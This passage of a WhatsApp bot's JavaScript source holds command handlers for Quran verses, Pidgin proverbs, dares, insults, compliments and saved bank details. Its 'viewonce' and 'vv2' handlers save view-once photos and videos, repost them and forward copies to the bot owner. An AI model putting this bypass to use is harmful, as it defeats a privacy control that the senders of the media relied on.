        const ayahNumber = arabic.numberInSurah;
        const surahNumber = arabic.surah.number;

        let response = `📖 *${surahName}* ( \){surahNameAr})\n` +
                       `*Surah ${surahNumber} : Ayah ${ayahNumber}*\n\n` +
                       `*Arabic:*\n${arabic.text}\n\n` +
                       `*Translation (Sahih International):*\n${english.text}`;

        await empire.sendMessage(m.chat, {
            text: response.slice(0, 4000),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: m });

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('[quran]', e.message);
        reply(`❌ Could not fetch the verse.\n\nCheck your format: ${prefix}quran 2:255`);
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
    }
    break;
}

case '❤️❤️❤️':
case 'vv2': {
    if (!m.quoted) return reply('✠ Reply to an image or video');

    const quoted = m.quoted;
    const mime = quoted.mimetype || '';

    if (!mime.startsWith('image/') && !mime.startsWith('video/')) {
        return reply('✠ Only image or video supported');
    }

    try {
        await reply('Downloading media 🔥');

        const mediaBuffer = await empire.downloadMediaMessage(quoted);

        if (!mediaBuffer || mediaBuffer.length < 100) {
            return reply('✠ Failed to download media');
        }

        if (mime.startsWith('image/')) {
            await empire.sendMessage(m.sender, {
                image: mediaBuffer,
                caption: quoted.caption || '✠ Photo download by 𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳',
                contextInfo: newsletterContext()
            });
        } else {
            await empire.sendMessage(m.sender, {
                video: mediaBuffer,
                caption: quoted.caption || '✠ Video download by 𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳',
                contextInfo: newsletterContext()
            });
        }

        reply('Media downloaded ,check in dm ✅');
    } catch (e) {
        console.error('cool error:', e);
        reply('✠ Failed to download or send media');
    }
    break;
}

case '❤️':
case 'viewonce':
case 'vv':
case 'reveal': {
    if (!isCreator) return reply('❌ Owner only!');
    
    try {
        // Extract quoted message from various possible locations
        const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
                       m.quoted?.message ||
                       m.message;
        
        if (!quoted) {
            await reply('👁️ *Usage:* Reply to a view-once message with `.viewonce`\n\nThe bot will reveal and forward it to your DM.');
            break;
        }
        
        // Check for view-once message types
        let mediaContent = null;
        let mediaType = null;
        let isViewOnce = false;
        
        // Check all possible view-once message structures
        const viewOnceKeys = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
        let viewOnceMsg = null;
        
        for (const key of viewOnceKeys) {
            if (quoted[key]) {
                viewOnceMsg = quoted[key];
                break;
            }
        }
        
        // If view-once wrapper found, extract inner message
        if (viewOnceMsg) {
            let innerMsg = viewOnceMsg.message || viewOnceMsg;
            if (viewOnceMsg.viewOnceMessageV2Extension) {
                innerMsg = viewOnceMsg.viewOnceMessageV2Extension;
            }
            if (innerMsg.message) {
                innerMsg = innerMsg.message;
            }
            
            // Check for media in inner message
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (innerMsg[type]) {
                    mediaContent = innerMsg[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        
        // If no view-once wrapper, check for regular media with viewOnce flag
        if (!isViewOnce) {
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (quoted[type] && quoted[type].viewOnce === true) {
                    mediaContent = quoted[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        
        // Also check if the quoted message itself is a media with viewOnce flag
        if (!isViewOnce) {
            const msg = quoted;
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (msg[type] && msg[type].viewOnce === true) {
                    mediaContent = msg[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        
        if (!isViewOnce || !mediaContent) {
            await reply('❌ No view-once media found. Please reply to a view-once image, video, audio, or sticker.');
            break;
        }
        
        try { cleanVicoTmp(); } catch (_) {}
        await reply('📥 *Revealing view-once media...*');
        
        // Download the media
        const mediaTypeName = mediaType.replace('Message', '').toLowerCase();
        const stream = await downloadContentFromMessage(mediaContent, mediaTypeName);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        if (!buffer || buffer.length === 0) {
            await reply('❌ Failed to download media. The file may be corrupted or expired.');
            break;
        }
        
        // Get file info
        const mimeType = mediaContent.mimetype || 'application/octet-stream';
        const extension = mimeType.split('/')[1]?.split(';')[0] || 'bin';
        const fileName = `viewonce_${Date.now()}.${extension}`;
        const caption = mediaContent.caption || '';
        
        // Get sender info
        const sender = m.quoted?.sender || m.sender || 'Unknown';
        const senderName = sender.split('@')[0];
        
        const revealCaption = `👁️ *View-Once Revealed*\n\n📤 *From:* @${senderName}\n📂 *Type:* ${mediaType.replace('Message', '')}\n🕐 *Time:* ${new Date().toLocaleString()}\n${caption ? `📝 *Caption:* ${caption}` : ''}\n\n🔒 *Original was view-once*`;
        
        // Get owner JID
        const ownerJid = owner[0] || botNumber;
        const ownerNum = ownerJid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        // ─── Send to current chat ───
        const sendOptions = { quoted: m, mentions: [sender] };
        
        if (mediaType === 'imageMessage') {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        } else if (mediaType === 'videoMessage') {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        } else if (mediaType === 'audioMessage') {
            await empire.sendMessage(m.chat, { 
                audio: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        } else if (mediaType === 'documentMessage') {
            await empire.sendMessage(m.chat, { 
                document: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        } else if (mediaType === 'stickerMessage') {
            await empire.sendMessage(m.chat, { 
                sticker: buffer,
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        } else {
            // Fallback: send as document
            await empire.sendMessage(m.chat, { 
                document: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption,
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, sendOptions);
        }
        
        // ─── Forward a copy to owner's DM ───
        if (ownerNum && ownerNum !== m.chat) {
            try {
                const ownerCaption = `📥 *View-Once Forwarded*\n\n📤 *From:* @${senderName}\n📂 *Type:* ${mediaType.replace('Message', '')}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *Original Chat:* ${m.chat}`;
                
                if (mediaType === 'imageMessage') {
                    await empire.sendMessage(ownerNum, { 
                        image: buffer, 
                        caption: ownerCaption, 
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    });
                } else if (mediaType === 'videoMessage') {
                    await empire.sendMessage(ownerNum, { 
                        video: buffer, 
                        caption: ownerCaption, 
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    });
                } else if (mediaType === 'audioMessage') {
                    await empire.sendMessage(ownerNum, { 
                        audio: buffer, 
                        mimetype: mimeType, 
                        fileName, 
                        caption: ownerCaption, 
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    });
                } else if (mediaType === 'stickerMessage') {
                    await empire.sendMessage(ownerNum, { 
                        sticker: buffer, 
                        caption: ownerCaption, 
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    });
                } else {
                    await empire.sendMessage(ownerNum, { 
                        document: buffer, 
                        mimetype: mimeType, 
                        fileName, 
                        caption: ownerCaption, 
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    });
                }
            } catch (e) {
                console.error('Failed to forward to owner:', e);
            }
        }
        
    } catch (e) {
        console.error('ViewOnce error:', e);
        await reply(`❌ Failed to reveal view-once: ${e.message || 'Unknown error'}`);
    }
    break;
}

case 'yarn':
case 'gist':
case 'proverb': {
 let yarns = [
  "No be who first call police dey win case.",
  "If you no get money, hide your face... your village people dey see you.",
  "Rat wey follow lizard enter rain, na sickness e go get.",
  "Life na turn by turn, today na your own, tomorrow na my own.",
  "No dey use electricity take play with NEPA office.",
  "Who no go no know, make you japa make you see.",
  "You dey whine me ni? I no be Indomie.",
  "No lele, hustle dey pay but e no dey show for face.",
  "Pikin wey say him mama no go sleep, him self no go sleep.",
  "If you chop alone, you go purge alone.",
  "Shege don show you small you don dey shout, na just intro be this.",
  "Water wey no reach you for back, no suppose reach you for front.",
  "You no fit use style take dodge karma.",
  "Even for hell, some people go still dey price firewood.",
  "Person wey dey find trouble go see am even for church.",
  "No be every japa na success, some na escape.",
  "If you dey borrow cloth dey do big boy, rain go disgrace you.",
  "Goat wey dey for party, no know say dem dey use am do asun.",
  "Empty drum dey make loudest noise.",
  "If e never tey, e no fit tey.",
  "Person wey no get work no dey get weekend.",
  "If you follow dog chop, you go follow am bark.",
  "Na who give up na him lose.",
  "If you dey fear village people, you no go ever blow.",
  "Hustle wey no get holiday, na money go pay am.",
  "No be every smile na love, some na format.",
  "If you see person wey fine pass you, na filter.",
  "Friend wey dey ask you money every week, na subscription.",
  "If you no sabi road, ask person wey don waka am.",
  "Man wey get data no dey lonely.",
  "No trust all these I love you for DM, na data remain.",
  "Girl wey love you no go stress you, she go bill you small small.",
  "Boy wey get sense no dey shout, e dey show workings.",
  "If you see girl dey reply fast, na two things - she like you or she need something.",
  "No be every sorry be from heart, some na just to escape slap.",
  "If your guy no dey show for your low, no carry am enter your high.",
  "Life no hard, na people inside am na him hard.",
  "If you no get money, even your shadow go leave you for sun.",
  "Everybody na boss till money enter matter.",
  "No dey form big man if your account dey whisper.",
  "If you wan know who love you, no get money for one week.",
  "Respect no dey for empty pocket.",
  "If you dey do good, do am make e loud - make your enemy vex.",
  "No dey explain yourself to person wey don decide to misunderstand you.",
  "If you want peace, no dey follow gossip group.",
  "Person wey talk too much no fit keep secret.",
  "If you see snake for your friend farm, no be your business till e enter your own.",
  "Patience get limit, na why tap get head.",
  "You no fit shine if you dey fear darkness.",
  "If you never chop breakfast, no dey advise person wey don chop dinner.",
  "No be every closed eye na sleep, some na plan.",
  "If you too dey available, dem go take you for granted.",
  "Loyalty no be for mouth, na for action.",
  "If person leave you for your worst, no carry am enter your best.",
  "No be everybody wey laugh with you like you.",
  "If you wan know your true guy, watch am when you no get shishi.",
  "Small body no be sickness, na packaging.",
  "If you dey carry person for mind wey no carry you, na overload.",
  "No dey beg for love, beg for money - love go come later.",
  "If she no dey call you, you no be priority - you be option.",
  "You fit fake lifestyle, you no fit fake peace of mind.",
  "If you no get joy, no spoil another person own.",
  "Wahala be like bicycle, e no dey finish.",
  "If you want make dem rate you, no dey beg for rating.",
  "Make you no dey do pass yourself because of Instagram.",
  "If you dey compare yourself with others, you no go ever happy.",
  "Na who get mind dey flex, no be who get money pass.",
  "If your prayer no work, try work too.",
  "God dey, but make you still lock your door for night.",
  "If you too dey trust, dem go use you.",
  "Person wey say money no be everything, na because e no get am.",
  "If you see free thing for Naija, run - na trap.",
  "Naija no hard, na you dey use style dodge work.",
  "If Nepa no take light, you no go know value of light.",
  "Police na your friend, till you get issue.",
  "If you no sabi price, enter market with person wey sabi.",
  "BRT fit leave you, but your leg no go leave you.",
  "If you dey waka for Lagos and you no look left and right, na danfo go teach you.",
  "No dey play with Lagos agbero, e get why dem dey road.",
  "If you no get thick skin for Lagos, you no go survive.",
  "Na person wey hold ladder na him dey fall most.",
  // EXTRA 20 HOT NEW YARNS
  "No be every mad man dey for Yaba, some dey for comment section.",
  "If you no get VICO XMD for your group, your group still dey for stone age.",
  "No be who get big head get sense, some na just big hat dem dey wear.",
  "Chicken wey dey run for day, na night e go enter pot.",
  "If you dey reason another man downfall, your own upfall no go show.",
  "No be every loud person get point, some just get data.",
  "If you see tortoise for fence, person put am there.",
  "Money na water, if you no fetch am, you go dey thirsty.",
  "Person wey dey laugh you today, go beg you tomorrow.",
  "If breeze blow, fowl yansh go open - no secret forever.",
  "Na who no dey fear to fall na him go fit climb high.",
  "If you carry person for head, e go want climb go sky.",
  "No be every shine na gold, some na foil paper.",
  "If you want make your enemy cry, focus on your own success.",
  "No dey promise for night wetin you no fit do for day.",
  "If you too dey shine, dem go use torchlight find your secret.",
  "Person wey don chop belleful na him dey talk say food no sweet.",
  "Na person wey hold microphone na him dey control crowd.",
  "If you no sabi how to waka for water, you no go fit swim for river.",
  "If you follow person wey no sabi road, you go miss bus stop."
 ]

 let pick = yarns[Math.floor(Math.random() * yarns.length)]
 await m.reply(`┏━━ *VICO XMD YARN* ━━┓\n┃\n┃ 🗣️ ${pick}\n┃\n┗━━━━━━━━━━━━┛`)
 break
}

// ═══════════════════════════════════════════════════
// SAVESTATUS - Simple instant save
// ═══════════════════════════════════════════════════

case 'dare': {
    const dares = [
        "Send your last-used emoji in the chat.",
        "Type your full name backwards.",
        "Send a 5-word compliment to the person above you.",
        "Change your WhatsApp status to 'I love VICO XMD' for 10 minutes.",
        "Send a voice note saying 'I am a mumu' in Nigerian accent.",
        "Mention 3 people in this group and say something nice about them.",
        "Send the most recent photo in your gallery (safe one).",
        "Text your crush 'I have something important to tell you' then leave them hanging.",
        "Say the alphabet backwards in a voice note.",
        "Send a funny selfie right now.",
        "Write a short poem about the person who tagged you.",
        "Change your profile picture to a cartoon character for 30 minutes.",
        "Send a voice note singing any song (even if your voice is bad).",
        "Type with your elbow for the next 3 messages.",
        "Tell a very bad joke in the group.",
        "Send your battery percentage + current time.",
        "Mention your best friend in this group and say something nice about them.",
        "Send a random emoji story (at least 8 emojis).",
        "Write 'I am the best' 10 times without stopping.",
        "Send a voice note explaining why you are the most fine person here.",
        "Change your WhatsApp name to 'Captain Mumu' for 15 minutes.",
        "Send the last song you listened to.",
        "Tag the quietest person in the group and ask them a question.",
        "Send a message using only emojis.",
        "Pretend to be the group admin for 2 minutes (fun way).",
        "Send a tongue twister and try to say it in voice note.",
        "Confess one small embarrassing thing (keep it light).",
        "Send a random fact about yourself.",
        "Type your reply with your eyes closed (try it).",
        "Send a message as if you are a robot.",
        "Tag 2 people and create a funny ship name for them.",
        "Send a voice note saying the longest word you know.",
        "Write a fake WhatsApp status that sounds dramatic.",
        "Send the ugliest emoji combination you can make.",
        "Speak only in questions for your next 3 messages.",
        "Send a compliment to the person who least expects it.",
        "Change your about/status to a song lyric for 20 minutes.",
        "Send a voice note laughing for 10 seconds straight.",
        "Type a message with every word starting with the same letter.",
        "Mention someone and dare them back.",
        "Send a random number between 1 and 100 and explain why you chose it.",
        "Write a short story (3 lines) about this group.",
        "Send a message in full CAPS only.",
        "Pretend the next message is a secret and whisper it (voice note).",
        "Tag the most active person and thank them.",
        "Send a funny warning message to the group.",
        "Write your name using only emojis.",
        "Send a voice note doing an animal sound.",
        "Make a prediction about someone in the group.",
        "Send a message as if you are the bot itself.",
        "Type the national anthem first line (any country).",
        "Send a random pickup line to the group.",
        "Mention someone and give them a fake award.",
        "Send a message with at least 15 emojis.",
        "Speak like a news presenter in a voice note.",
        "Write a fake advertisement about yourself.",
        "Send the time + your current mood in emojis.",
        "Tag someone and tell them a random fun fact.",
        "Send a message using only one letter of the alphabet repeatedly.",
        "Create a funny nickname for 3 people in the group.",
        "Send a voice note saying 'I am the chosen one'.",
        "Write a short motivational quote (make it up).",
        "Send a message as if you are angry (but funny).",
        "Mention the last person who messaged and compliment them.",
        "Send a random dare back to someone.",
        "Type a message without using the letter 'e'.",
        "Send a voice note counting from 1 to 20 very fast.",
        "Make a funny excuse for why you are online now.",
        "Send a message in Pidgin English only.",
        "Tag someone and ask them their biggest fear (fun way).",
        "Send a fake confession (keep it clean and funny).",
        "Write a 2-line rap about this group.",
        "Send the most random thing on your mind right now.",
        "Change your typing style for the next 5 minutes (example: add 'nya' at the end).",
        "Send a voice note saying a proverb you know.",
        "Mention two people and say they should be friends.",
        "Send a message that sounds like a conspiracy theory about the group.",
        "Type your next message with the opposite hand.",
        "Send a fun challenge to the whole group.",
        "Say something positive about yourself in a voice note.",
        "Send a random emoji and force others to interpret it.",
        "Write a fake news headline about someone here.",
        "Send a message as if you are whispering a secret.",
        "Tag the person you think is the funniest and tell them why.",
        "Send a short prayer or wish for the group (funny or serious).",
        "Make up a new rule for this group and announce it.",
        "Send a voice note trying to sound like a different gender.",
        "Write a message that must contain the word 'VICO' three times.",
        "Send a random question to the group and wait for answers.",
        "Pretend you just woke up and send a confused message.",
        "Send a compliment using only emojis + one word.",
        "Tag someone and dare them to send a voice note.",
        "Create a funny conspiracy about why this group exists.",
        "Send a message with inverted words (example: 'olleh' for hello).",
        "Say the name of everyone you can remember in this group (voice note).",
        "Send a dramatic entrance message as if you just joined.",
        "Write a short letter to your future self (2-3 lines).",
        "Send the funniest thing that happened to you this week (short).",
        "End your next 3 messages with 'periodt'.",
        "Send a voice note saying 'I go better your life' in Nigerian way."
    ];

    const dare = dares[Math.floor(Math.random() * dares.length)];
    reply(`🔥 *DARE*\n\n${dare}`);
    break;
}
// ═══════════════════════════════════════════════════
// DONATE - Show payment info
// ═══════════════════════════════════════════════════
case 'donate': {
    const donateText = `Support us please 🙏❤️ 

─「 🏦 ᴘᴀʏᴍᴇɴᴛ ɪɴғᴏ 」  
├─❏ ɴᴀᴍᴇ: ᴍᴀʀᴊᴀɴᴇ ɴɴᴀᴍᴅɪ
├─❏ ᴀᴄᴄ ɴᴏ: 9129873629
├─❏ ʙᴀɴᴋ: sᴍᴀʀᴛᴄᴀsʜ
└─❏ ᴅʀᴏᴘ sᴄʀᴇᴇɴsʜᴏᴛ ᴀғᴛᴇʀ ᴘᴀʏᴍᴇɴᴛ ✅`;
    
    reply(donateText);
    break;
}

// ═══════════════════════════════════════════════════
// SETAZA - Save user's bank details
// ═══════════════════════════════════════════════════


case 'setaza': {
    let input = (text || q || '').trim();
    if (!input) {
        input = (m.body || m.text || body || '').replace(/^\.?setaza\s*/i, '').trim();
    }
    if (!input) {
        return reply(
            `✠ *SET YOUR AZA*\n\n` +
            `*Format:*\n` +
            `${prefix}setaza <account>, <bank>, <name>\n\n` +
            `*Example:*\n` +
            `${prefix}setaza 9129873629, Moniepoint Bank, Chukwu Ahmed`
        );
    }
    // Prefer comma-separated: number, bank, name
    let accNo, bank, name;
    if (input.includes(',')) {
        const parts = input.split(',').map(s => s.trim()).filter(Boolean);
        if (parts.length < 3) {
            return reply('✠ Need 3 parts separated by commas:\nAccount, Bank, Name');
        }
        accNo = parts[0].replace(/\s/g, '');
        bank = parts[1];
        name = parts.slice(2).join(', ');
    } else if (input.includes('\n')) {
        const lines = input.split('\n').map(l => l.trim()).filter(Boolean);
        if (lines.length < 3) return reply('✠ Need account, bank, name');
        accNo = lines[0].replace(/\s/g, '');
        bank = lines[1];
        name = lines.slice(2).join(' ');
    } else {
        return reply(
            `✠ Use commas:\n${prefix}setaza 9129873629, Moniepoint Bank, Chukwu Ahmed`
        );
    }
    if (!/^\d{8,15}$/.test(accNo)) {
        return reply('✠ Account number must be 8–15 digits only.');
    }
    const dbAza = loadAzaDB();
    if (dbAza[m.sender]) {
        return reply(`⚠️ You already have bank details saved!\nUse *${prefix}delaza* first.`);
    }
    dbAza[m.sender] = { accNo, bank: bank.trim(), name: name.trim() };
    saveAzaDB(dbAza);
    reply(
        `✅ *Bank details saved!*\n\n` +
        `🏦 *BANK DETAILS*\n\n` +
        `🔢 *${accNo}*\n` +
        `🟢 *${bank.toUpperCase()}*\n` +
        `😎 *${name.toUpperCase()}*\n\n` +
        `*SEND SCREENSHOT AFTER PAYMENT*`
    );
    break;
}



// ═══════════════════════════════════════════════════
// AZA - Show saved bank details
// ═══════════════════════════════════════════════════
case 'aza': {
    const dbAza = loadAzaDB();
    const data = dbAza[m.sender];

    if (!data) {
        return reply('✠ Please set ur account number using .setaza');
    }

    const { accNo, bank, name } = data;

    reply(`🏦 *BANK DETAILS*

😎 *${name.toUpperCase()}*
🔢 *${accNo}*
🟢 *${bank.toUpperCase()}*

*SEND SCREENSHOT AFTER PAYMENT*`);
    break;
}

// ═══════════════════════════════════════════════════
// DELAZA / REMOVEAZA - Delete bank details
// ═══════════════════════════════════════════════════
case 'delaza':
case 'removeaza': {
    const dbAza = loadAzaDB();
    if (!dbAza[m.sender]) {
        return reply('✠ You don\'t have any bank details saved. Use .setaza to create one.');
    }
    delete dbAza[m.sender];
    saveAzaDB(dbAza);
    reply('✅ *Bank details deleted successfully!*\n\nYou can now create new one using .setaza');
    break;
}



case 'insult': {
    try {
        let userToInsult = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);

        if (!userToInsult) {
            return reply(`❌ Mention someone or reply to their message.\nExample: ${prefix}insult @user`);
        }

        const insults = [
            "You this one, your head no correct at all!",
            "Omo you dey form busy but you no dey do anything.",
            "Your brain dey on airplane mode since morning.",
            "You resemble the kind person wey dey always miss the point.",
            "You this mumu, even your shadow dey shame you.",
            "Your sense don expire like pure water wey stay under sun.",
            "You dey talk as if your mouth no get control.",
            "You be the reason why they say 'look before you leap'.",
            "Your head dey carry heavy load of yeye thoughts.",
            "You this one, even your WiFi no gree connect to sense.",
            "You dey form, but your form no complete.",
            "Your life be like buffering video — always loading.",
            "You this person, your presence alone fit scatter joy.",
            "You resemble someone wey dem born without instruction manual.",
            "Your brain dey do lag anytime e matter.",
            "You this one, even google no fit find sense for your head.",
            "You dey always come first... for last place.",
            "Your own na special kind of mumu.",
            "You be walking red flag with legs.",
            "Your sense dey AWOL since last year.",
            "You this one, your mouth dey write cheque wey your brain no fit cash.",
            "Even your ancestors dey look you with pity.",
            "You resemble the kind person wey go miss free food.",
            "Your head no correct, and the evidence dey clear.",
            "You this mumu, you dey try hard but e no dey show.",
            "Your own level of dullness na international standard.",
            "You be the reason why silence is golden.",
            "Your brain take unpaid leave long time ago.",
            "You this one, even pure water get more value than your opinion.",
            "You dey form original but you be fake copy.",
            "Your life be like bad network — always frustrating.",
            "You this person, your common sense dey on vacation.",
            "Even your reflection dey avoid you for mirror.",
            "You resemble someone wey dem use for example of how not to live.",
            "Your own na premium mumu package.",
            "You dey talk nonsense with full confidence.",
            "Your head dey full of gala and pure water thoughts.",
            "You this one, your future dey fear you.",
            "You be the human version of 'error 404'.",
            "Your sense dey hide anytime e suppose show.",
            "You this mumu, even your shadow dey walk faster than your brain.",
            "Your contribution to any discussion na zero.",
            "You resemble the kind person wey go follow wrong crowd with full chest.",
            "Your own level of uselessness na talent.",
            "You dey always appear where dem no need you.",
            "Your brain capacity no reach this conversation.",
            "You this one, even street no gree claim you.",
            "Your life be like expired product — still dey shelf but no value.",
            "You dey form wise but your actions dey expose you.",
            "Your head no reach, and e no go ever reach.",
            "You this person, your presence dey reduce the IQ of the group.",
            "Even your name alone fit cause wahala.",
            "You resemble someone wey dem send to buy sense but e miss road.",
            "Your own na special edition of dullness.",
            "You dey always miss the main point by country mile.",
            "Your brain dey do selective work — only when e no matter.",
            "You this mumu, your confidence pass your ability.",
            "You be the reason why some people dey avoid group chat.",
            "Your sense dey on low battery permanently.",
            "You this one, even your mistakes get mistakes.",
            "Your contribution na just noise pollution.",
            "You resemble the kind person wey go argue with traffic light.",
            "Your own head na pure decoration.",
            "You dey try to shine but you be torchlight without battery.",
            "Your life be like bad movie — everybody wan skip.",
            "You this person, your common sense take French leave.",
            "Even the air around you dey heavier.",
            "You be walking example of 'wetin concern me'.",
            "Your brain dey strike more than ASUU.",
            "You this mumu, your thoughts dey always late.",
            "Your own na certified original dullard.",
            "You dey form soft but your head hard like stone.",
            "Your presence alone fit spoil good morning.",
            "You resemble someone wey dem use as warning sign.",
            "Your sense no reach to even know say e no reach.",
            "You this one, your future tense dey fear present tense.",
            "Your mouth dey run more than your brain.",
            "You be the human equivalent of 'please wait'.",
            "Your own level of confusion na art.",
            "You dey always bring low energy to high places.",
            "Even your excuses dey tired of you.",
            "You this person, your brain dey do remote work from another planet.",
            "Your contribution to progress na negative.",
            "You resemble the kind person wey go lose for free competition.",
            "Your head no correct, full stop.",
            "You this mumu, even your WiFi password get more sense.",
            "Your life be like loading screen wey no wan finish.",
            "You dey form main character but you be extra.",
            "Your own na pure side character energy.",
            "You this one, your thoughts dey need editor.",
            "Even your shadow dey ashamed to follow you.",
            "You be the reason why some people dey use 'block' button.",
            "Your sense dey always arrive after the party.",
            "You this person, your head na tourist attraction for confusion.",
            "Your own na limited edition of mumu.",
            "You dey always miss road even when map dey your hand.",
            "Your brain capacity no reach to process this insult.",
            "You this one, even pure water dey look you sideways.",
            "Your presence dey cause collective headache.",
            "You resemble someone wey dem born with factory reset button missing.",
            "Your own final answer na mumu."
        ];

        const insult = insults[Math.floor(Math.random() * insults.length)];

        await empire.sendMessage(m.chat, {
            text: `Hey @${userToInsult.split('@')[0]}, ${insult}`,
            mentions: [userToInsult],
            contextInfo: newsletterContext({ mentionedJid: [userToInsult] })
        }, { quoted: m });

    } catch (e) {
        console.error('Insult Error:', e);
        reply('❌ Failed to send the insult.');
    }
    break;
}

case 'compliment':
case 'compliments': {
    try {
        let userToCompliment = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);

        if (!userToCompliment) {
            return reply(`❌ Mention someone or reply to their message.\nExample: ${prefix}compliment @user`);
        }

        const compliments = [
            "You have a light that makes hard days softer.",
            "Your smile genuinely brightens the room.",
            "You are smarter than you realize.",
            "Your kindness is rare and valuable.",
            "You carry yourself with quiet confidence.",
            "People feel safer when you are around.",
            "Your energy is calm and powerful at the same time.",
            "You make ordinary moments feel special.",
            "Your heart is one of your greatest strengths.",
            "You have a beautiful way of seeing people.",
            "Your presence alone improves the mood.",
            "You are more capable than your doubts suggest.",
            "Your honesty is refreshing.",
            "You inspire others without even trying.",
            "Your laugh is pure medicine.",
            "You have excellent taste and good judgment.",
            "Your loyalty is something people can trust.",
            "You handle pressure with real grace.",
            "Your creativity shows in everything you do.",
            "You are easy to respect and hard to forget.",
            "Your voice brings comfort when it is needed.",
            "You make growth look natural.",
            "Your patience is a real gift.",
            "You notice details others miss.",
            "Your courage shows up in small everyday choices.",
            "You are a genuine person in a noisy world.",
            "Your mind is sharp and your heart is soft.",
            "You lift people up with simple words.",
            "Your style is uniquely yours.",
            "You make hard conversations easier.",
            "Your support means more than you know.",
            "You are dependable in the best way.",
            "Your optimism is contagious.",
            "You turn challenges into lessons quickly.",
            "Your sense of humor is perfectly timed.",
            "You treat people with real dignity.",
            "Your ambition is inspiring, not arrogant.",
            "You have a gift for making others feel seen.",
            "Your strength is quiet but steady.",
            "You bring balance into chaotic spaces.",
            "Your curiosity keeps life interesting.",
            "You are thoughtful in ways that matter.",
            "Your discipline is impressive.",
            "You make teamwork feel effortless.",
            "Your empathy is a superpower.",
            "You have a warm and welcoming spirit.",
            "Your ideas are worth listening to.",
            "You recover from setbacks with dignity.",
            "Your integrity never goes out of style.",
            "You make people want to be better.",
            "Your focus is admirable.",
            "You have a rare combination of brains and heart.",
            "Your compliments always feel sincere.",
            "You handle success without losing humility.",
            "Your friendship is a blessing.",
            "You speak with clarity and care.",
            "Your work ethic sets a high standard.",
            "You make learning look exciting.",
            "Your calm under stress is rare.",
            "You are generous with your time and attention.",
            "Your confidence encourages others.",
            "You have a beautiful sense of timing.",
            "Your intuition is usually right.",
            "You make difficult things look manageable.",
            "Your honesty builds real trust.",
            "You are thoughtful even when busy.",
            "Your presence is peaceful.",
            "You celebrate others without envy.",
            "Your resilience is outstanding.",
            "You have a magnetic but gentle personality.",
            "Your words carry weight because you mean them.",
            "You make people feel valued.",
            "Your perspective is wise beyond your years.",
            "You bring excellence without arrogance.",
            "Your sincerity is easy to feel.",
            "You are a natural encourager.",
            "Your standards are high for the right reasons.",
            "You make growth feel possible.",
            "Your smile has healed more than you know.",
            "You are consistent, and that is rare.",
            "Your creativity solves real problems.",
            "You listen in a way that heals.",
            "Your ambition is balanced with kindness.",
            "You make the group better just by being in it.",
            "Your energy is pure positive fuel.",
            "You have a gift for peaceful leadership.",
            "Your gratitude is contagious.",
            "You handle criticism with maturity.",
            "Your imagination is a true asset.",
            "You are brave enough to be yourself.",
            "Your care for people is visible.",
            "You make progress look steady and sure.",
            "Your mind is full of useful ideas.",
            "You bring light into heavy conversations.",
            "Your respect for others stands out.",
            "You are a rare type of genuine.",
            "Your effort never goes unnoticed.",
            "You make excellence look approachable.",
            "Your warmth stays with people.",
            "You are exactly the person someone needed today.",
            "Your heart is in the right place always.",
            "You turn small chances into big wins.",
            "Your honesty is gentle, not harsh.",
            "You have a gift for practical wisdom.",
            "Your joy is authentic.",
            "You make hard work look meaningful.",
            "Your support changes outcomes.",
            "You are reliable when it counts.",
            "Your curiosity opens new doors.",
            "You treat success as a responsibility.",
            "Your kindness costs nothing and changes everything.",
            "You have a calm strength others lean on.",
            "Your vision is clear and hopeful.",
            "You make friendship feel easy.",
            "Your growth is obvious and impressive.",
            "You speak life into tired people.",
            "Your patience creates safety.",
            "You are thoughtful with your choices.",
            "Your excellence inspires quiet respect.",
            "You make ordinary days memorable.",
            "Your courage is practical and real.",
            "You have a beautiful way of encouraging others.",
            "Your focus helps everyone around you.",
            "You are a steady light in uncertain times.",
            "Your gratitude makes life richer.",
            "You handle power with humility.",
            "Your creativity is fresh and useful.",
            "You make people feel included.",
            "Your integrity is your reputation.",
            "You are gentle without being weak.",
